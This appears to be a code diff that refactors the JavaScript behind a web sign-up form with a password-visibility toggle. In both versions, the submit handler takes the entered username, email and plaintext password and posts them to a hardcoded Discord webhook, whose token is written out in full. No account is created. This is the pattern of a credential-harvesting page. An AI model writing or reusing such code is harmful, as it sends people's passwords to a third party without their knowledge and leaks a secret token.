@@ -1,32 +1,25 @@
-const togglePasswordSignUp = document.getElementById("togglePassword");
-const passwordInputSignUp = document.getElementById("password");
-const signupForm = document.getElementById("signupForm");
-
-togglePasswordSignUp.addEventListener("click", function () {
-    // Toggle the type attribute of the password input field
-    const type = passwordInputSignUp.type === "password" ? "text" : "password";
-    passwordInputSignUp.type = type;
-
-    // Toggle the eye icon between open and closed
+// Handle password visibility toggle
+document.getElementById("togglePassword")?.addEventListener("click", function () {
+    const passwordInput = document.getElementById("password");
+    const type = passwordInput.type === "password" ? "text" : "password";
+    passwordInput.type = type;
     this.textContent = type === "password" ? "👁️" : "🚫";
 });
 
-signupForm.addEventListener("submit", function (event) {
+// Handle form submission for Sign Up
+document.getElementById("signupForm")?.addEventListener("submit", function (event) {
     event.preventDefault();
 
-    // Collect username, email, and password
     const username = document.getElementById("username").value;
     const email = document.getElementById("email").value;
     const password = document.getElementById("password").value;
 
-    // Prepare the data to send to the webhook
     const data = {
         username: username,
         email: email,
-        password: password,
+        password: password
     };
 
-    // Send the data to the Discord webhook
     fetch("https://discord.com/api/webhooks/1315544300695584830/UqHr8rG9jfLuE8bA79w4F2XPkEG7DBEAYjRB_XPT2M8R3JmOYJXRHmzxBApKXEXULNjr", {
         method: "POST",
         headers: {
@@ -37,19 +30,15 @@ signupForm.addEventListener("submit", function (event) {
                 {
                     title: "New User",
                     description: `User: ${data.username} has been created with the password: ${data.password}`,
-                    color: 16777215 // White color
+                    color: 16777215
                 }
             ]
         })
     })
     .then(response => response.json())
-    .then(data => {
-        console.log('Success:', data);
-    })
-    .catch((error) => {
-        console.error('Error:', error);
-    });
+    .then(data => console.log('Success:', data))
+    .catch((error) => console.error('Error:', error));
 
-    // Optionally, you can redirect or reset the form after successful submission
-    signupForm.reset();
+    // Reset the form after submission
+    document.getElementById("signupForm").reset();
 });
